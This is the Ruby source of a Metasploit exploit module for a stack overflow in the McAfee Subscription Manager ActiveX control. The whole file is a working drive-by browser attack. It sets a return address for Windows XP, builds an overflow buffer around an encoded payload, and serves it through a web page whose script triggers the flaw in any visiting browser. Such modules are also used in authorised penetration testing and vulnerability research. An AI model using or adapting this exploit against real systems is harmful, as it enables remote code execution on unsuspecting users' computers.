require 'msf/core'

module Msf

class Exploits::Windows::Browser::McAfeeMcSubMgrVsprintf < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'McAfee Subscription Manager Stack Overflow',
			'Description'    => %q{
				This module exploits a flaw in the McAfee Subscription Manager ActiveX control.
				Due to an unsafe use of vsprintf, it is possible to trigger a stack overflow by
				passing a large string to one of the COM-exposed routines, such as IsAppExpired.
				This vulnerability was discovered by Karl Lynn of eEye.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'skape', 
				],
			'Version'        => '$Revision: 3783 $',
			'References'     => 
				[
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2006-August/048565.html' ]
				],
			'Payload'        =>
				{
					'Space'          => 1014,
					'MaxNops'        => 0,
					'BadChars'       => "\x00\x09\x0a\x0d'\\" + Rex::Text::UpperAlpha + Rex::Text::HighAscii,
					'EncoderType'    => Msf::Encoder::Type::NonUpperUtf8Safe,
					'EncoderOptions' =>
						{
							'BufferOffset' => 0x8
						}
				},
			'Targets'        =>
				[
					# Target 0: Automatic
					[
						'Windows XP SP0/SP1',
						{
							'Platform' => 'win',
							'Rets'     => 
								[
									0x7605122f, # XP SP0/SP1 shell32.dll: jmp esp
									#0x773f346a  # XP SP2 comctl32.dll: jmp esp
								]
						},
					],
				],
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end
	
	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Pick the right target
		case request['User-Agent']
			when /Windows NT 5.1/
				ret = target['Rets'][0]
			else
				print_error("Unsupported target: #{request['User-Agent']}")
				cli.send_response(create_response(404, 'File not found'))
				return
		end

		# Build out our overflow buffer
		buf = 
			Rex::Text.rand_text(2972, payload_badchars) +
			[ ret ].pack('V') + 
			"\x60" + # pusha
			"\x6a" + Rex::Text.rand_char(payload_badchars) + # push byte 0x1
			"\x6a" + Rex::Text.rand_char(payload_badchars) + # push byte 0x1
			"\x6a" + Rex::Text.rand_char(payload_badchars) + # push byte 0x1
			"\x61" + # popa
			p.encoded

		# Generate random variable names
		vname    = Rex::Text.rand_text_alpha(rand(100) + 1)
		strname  = Rex::Text.rand_text_alpha(rand(100) + 1)

		# Build out the message
		content = 
			"<html>" +
			"<object classid='clsid:9BE8D7B2-329C-442A-A4AC-ABA9D7572602' id='#{vname}'></object>" +
			"<script language='javascript'>\n" +
			"var #{vname} = document.getElementById('#{vname}');\n" +
			"var #{strname} = new String('#{buf}');\n" +
			"#{vname}.IsAppExpired(#{strname}, #{strname}, #{strname});\n" +
			"</script>" +
			"</html>"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, content)
	end

end

end
